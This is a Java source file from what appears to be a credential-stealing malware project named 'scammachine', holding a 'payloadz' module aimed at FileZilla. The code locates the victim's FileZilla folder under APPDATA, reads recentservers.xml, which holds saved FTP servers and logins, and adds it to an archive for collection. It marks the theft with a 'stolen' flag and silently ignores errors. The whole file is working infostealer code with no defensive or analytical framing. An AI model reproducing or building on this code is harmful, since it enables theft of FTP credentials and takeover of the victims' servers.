package me.teejayx6.scammachine.payloadz;

import me.teejayx6.scammachine.util.ArchiveUtil;
import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;

import java.io.File;

public class FileZilla
{
    public static boolean stolen = false;

    public static void execute()
    {
        String appdata = System.getenv("APPDATA");
        if (!appdata.endsWith("\\"))
            appdata += "\\";

        String path = appdata + "FileZilla";
        File file = new File(path);

        if (file.exists() && file.isDirectory())
        {
            File recentservers = new File(path + "\\recentservers.xml");
            if (recentservers.exists() && !recentservers.isDirectory())
            {
                try
                {
                    TempFile tmp = FileUtils.readFile(recentservers.getAbsolutePath());
                    if (tmp != null)
                    {
                        stolen = true;
                        ArchiveUtil.addFile("FileZilla/recentservers.xml", tmp.bytes);
                        FileUtils.close(tmp);
                    }
                }
                catch (Exception e)
                {

                }
            }
        }
    }
}
